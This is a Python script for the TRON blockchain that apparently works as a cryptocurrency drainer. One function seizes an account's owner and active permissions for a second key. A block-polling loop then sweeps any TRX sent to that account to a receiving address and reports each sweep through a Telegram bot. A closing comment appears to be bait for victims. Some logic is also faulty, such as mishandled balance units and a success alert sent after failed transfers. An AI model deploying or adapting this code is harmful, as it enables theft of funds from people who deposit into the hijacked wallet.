from decimal import Decimal
import os
import aiohttp
import asyncio
import typing
from enum import Enum
from loguru import logger
from pydantic import BaseModel
from tronpy.async_tron import AsyncTron, AsyncHTTPProvider
from tronpy.keys import to_base58check_address, PrivateKey, PublicKey
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

load_dotenv()

RECEIVE_ADDRESS = os.getenv("RECEIVE_ADDRESS")
TRON_API_KEY = os.getenv("TRON_API_KEY")
ADDRESS_A_PRIVATE_KEY = os.getenv("ADDRESS_A_PRIVATE_KEY")
ADDRESS_B_PRIVATE_KEY = os.getenv("ADDRESS_B_PRIVATE_KEY")
PROXY_ENERGY_ADDRESS = os.getenv("PROXY_ENERGY_ADDRESS")
TELEGRAM_USER_ID = os.getenv("TELEGRAM_USER_ID")
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")

assert RECEIVE_ADDRESS, "RECEIVE_ADDRESS is None."
assert TRON_API_KEY, "TRON_API_KEY is None."
assert ADDRESS_A_PRIVATE_KEY, "ADDRESS_A_PRIVATE_KEY is None."
assert ADDRESS_B_PRIVATE_KEY, "ADDRESS_B_PRIVATE_KEY is None."
assert PROXY_ENERGY_ADDRESS, "PROXY_ENERGY_ADDRESS is None."
assert TELEGRAM_USER_ID, "TELEGRAM_USER_ID is None."
assert TELEGRAM_TOKEN, "TELEGRAM_TOKEN is None."

ADDRESS_A_KEY = PrivateKey(bytes.fromhex(ADDRESS_A_PRIVATE_KEY))
ADDRESS_B_KEY = PrivateKey(bytes.fromhex(ADDRESS_B_PRIVATE_KEY))

assert ADDRESS_A_KEY.public_key, "ADDRESS_A_KEY.public_key is None."
assert ADDRESS_B_KEY.public_key, "ADDRESS_B_KEY.public_key is None."

ADDRESS_A = ADDRESS_A_KEY.public_key.to_base58check_address()
ADDRESS_B = ADDRESS_B_KEY.public_key.to_base58check_address()

TRON_DECIMAL = Decimal("1e6")
TRON_MINIMUM_BANDWIDTH = Decimal("270000")
TELEGRAM_BOT = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
TRON = AsyncTron(AsyncHTTPProvider(api_key=TRON_API_KEY))


class TransactionParameter(BaseModel):
    transaction_type: typing.Literal["TRX"]
    transaction_hash: str
    from_address: str
    to_address: str
    amount: Decimal


class Config(Enum):
    transfer_type = "TransferContract"


class TransactionSign(BaseModel):
    """签名交易参数"""

    from_address: str
    to_address: str
    amount: int
    sign_key: PrivateKey
    model_config = {"arbitrary_types_allowed": True}


async def get_trx_balance(address: str):
    """获取用户TRX余额"""
    account_balance = await TRON.get_account_balance(ADDRESS_A)
    return Decimal(str(account_balance)) * TRON_DECIMAL


async def get_account_bandwidth(address: str):
    """获取用户的带宽余额"""
    account_bandwidth = await TRON.get_bandwidth(ADDRESS_A)
    return Decimal(str(account_bandwidth)) * Decimal("1000")


async def transfer_trx(transaction_sign: TransactionSign):
    """转账TRX函数"""
    try:
        transaction = await TRON.trx.transfer(
            from_=transaction_sign.from_address,
            to=transaction_sign.to_address,
            amount=transaction_sign.amount,
        ).build()

        txn = await transaction.sign(transaction_sign.sign_key).broadcast()
        await txn.wait()
        logger.success(f"🚀 转账成功 txID:{txn.txid}")
        return txn.txid
    except Exception as err:
        logger.error(f"❌ 转账TRX错误:{err}")


async def multiple_visas(account: PrivateKey, update_address: str):
    """多签函数"""
    if account.public_key is None:
        logger.error("account.public_key is None.")
        raise Exception("account.public_key is None.")
    try:
        address = account.public_key.to_base58check_address()
        permission = await TRON.get_account_permission(address)

        permission["owner"]["keys"][0]["address"] = update_address
        permission["actives"][0]["threshold"] = 1
        permission["actives"][0]["keys"] = [{"address": update_address, "weight": 1}]
        transaction = await TRON.trx.account_permission_update(address, permission).build()
        txn = await transaction.sign(ADDRESS_B_KEY).broadcast()
        await txn.wait()
        logger.success(f"🚀 多签成功 txID:{txn.txid}")
    except Exception as err:
        logger.error(f"多签错误:{err}")


async def proxy_gas(transaction_sign: TransactionSign, proxy_type: typing.Literal["ENERGY", "BANDWIDTH"] = "ENERGY"):
    """代理能量和带宽，默认自动代理能量 默认代理from能量

    🔸转账  1.5  Trx=  1 笔能量
    🔸转账  3.0  Trx=  2 笔能量
    🔸转账  4.5  Trx=  3 笔能量
    🔸转账  6.0  Trx=  4 笔能量
    🔸转账  7.5  Trx=  5 笔能量
    单笔 1.5 Trx，以此类推，最大 5 笔
    1.向无U地址转账，需要双倍能量。
    2.请在1小时内转账，否则过期回收。
    """
    if proxy_type == "ENERGY":
        await transfer_trx(transaction_sign)


async def send_trx():
    """调用转账"""
    assert RECEIVE_ADDRESS, "RECEIVE_ADDRESS is None."
    assert TELEGRAM_USER_ID, "TELEGRAM_USER_ID is None."

    account_balance = await get_trx_balance(ADDRESS_A)
    account_bandwidth = await get_account_bandwidth(ADDRESS_A)

    if account_bandwidth >= TRON_MINIMUM_BANDWIDTH:
        transaction_sign = TransactionSign(
            from_address=ADDRESS_A,
            to_address=RECEIVE_ADDRESS,
            amount=int(account_balance),
            sign_key=ADDRESS_B_KEY,
        )
    else:
        transaction_sign = TransactionSign(
            from_address=ADDRESS_A,
            to_address=RECEIVE_ADDRESS,
            amount=int(account_balance - TRON_MINIMUM_BANDWIDTH),
            sign_key=ADDRESS_B_KEY,
        )

    txID = await transfer_trx(transaction_sign)
    # https://shasta-tronscan.on.btfs.io/#/transaction/
    # https://tronscan.org/#/transaction/
    if txID is None:
        await TELEGRAM_BOT.bot.sendMessage(chat_id=TELEGRAM_USER_ID, text="❌ 转账失败")
    text = f"🚀 转账成功 txID: https://tronscan.org/#/transaction/{txID}"
    await TELEGRAM_BOT.bot.sendMessage(chat_id=TELEGRAM_USER_ID, text=text)


async def get_now_block():
    # "https://api.shasta.trongrid.io/wallet/getnowblock"
    url = "https://api.trongrid.io/wallet/getnowblock"  # "https://api.trongrid.io/wallet/getnowblock"
    headers = {
        "accept": "application/json",
        "TRON-PRO-API-KEY": TRON_API_KEY,
    }
    async with aiohttp.ClientSession() as session:
        last_time_block_number: int = 0
        while True:
            async with session.get(url=url, headers=headers, ssl=False) as response:
                if response.status != 200:
                    logger.error(f"请求状态码不是200:{await response.json()}")
                    await asyncio.sleep(1.5)
                    return
                json_data = await response.json()
                block_number: int = json_data["block_header"]["raw_data"]["number"]

                if block_number > last_time_block_number:
                    last_time_block_number = block_number
                else:
                    await asyncio.sleep(1.5)
                    continue

                logger.info(f"当前区块:{last_time_block_number}")
                if not "transactions" in json_data:
                    continue
                transactions = json_data["transactions"]

                for transaction in transactions:
                    contract = transaction["raw_data"]["contract"][0]
                    contract_type: str = contract["type"]
                    if contract_type == Config.transfer_type.value:
                        parameter_value = contract["parameter"]["value"]
                        yield TransactionParameter(
                            transaction_type="TRX",
                            transaction_hash=transaction["txID"],
                            from_address=to_base58check_address(parameter_value["owner_address"]),
                            to_address=to_base58check_address(parameter_value["to_address"]),
                            amount=parameter_value["amount"],
                        )


async def start():
    async for transaction in get_now_block():
        # 如果有人向ADDRESS_A转账则进行转出TRX
        if transaction.to_address == ADDRESS_A:
            asyncio.create_task(send_trx())


async def main():
    # account_balance = await TRON.get_account_balance(ADDRESS_A)
    # print("account_balance:", int(Decimal(str(account_balance)) * TRON_DECIMAL))

    # account_bandwidth = await TRON.get_bandwidth(ADDRESS_A)
    # print("account_bandwidth:", account_bandwidth)

    # if account_bandwidth >= TRON_MINIMUM_BANDWIDTH:
    #     transaction_sign = TransactionSign(
    #         from_address=ADDRESS_A,
    #         to_address=ADDRESS_B,
    #         amount=int(Decimal(str(account_balance)) * TRON_DECIMAL),
    #         sign_key=ADDRESS_B_KEY,
    #     )
    # else:
    #     transaction_sign = TransactionSign(
    #         from_address=ADDRESS_A,
    #         to_address=ADDRESS_B,
    #         amount=int(Decimal(str(account_balance)) * TRON_DECIMAL) - TRON_MINIMUM_BANDWIDTH,
    #         sign_key=ADDRESS_B_KEY,
    #     )
    # await transfer_trx(transaction_sign)

    # await start()
    # await multiple_visas()
    # await app.bot.sendMessage(chat_id=TELEGRAM_USER_ID, text="123")
    await start()
    ...


# 7622931745
async def hello(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f"user id: {update.effective_user.id}")  # type: ignore


def get_telegram_user_id():
    TELEGRAM_BOT.add_handler(CommandHandler("hello", hello))
    TELEGRAM_BOT.run_polling()


if __name__ == "__main__":
    # logger.remove()
    logger.add(
        sink="logs/app.log",
        rotation="1 day",  # 按天切分
        retention="7 days",  # 保留 7 天
        compression="zip",  # 旧日志压缩
        encoding="utf-8",
        enqueue=True,
    )
    asyncio.run(main())
    # get_telegram_user_id()


"""
送你600带宽  能量不送


"""
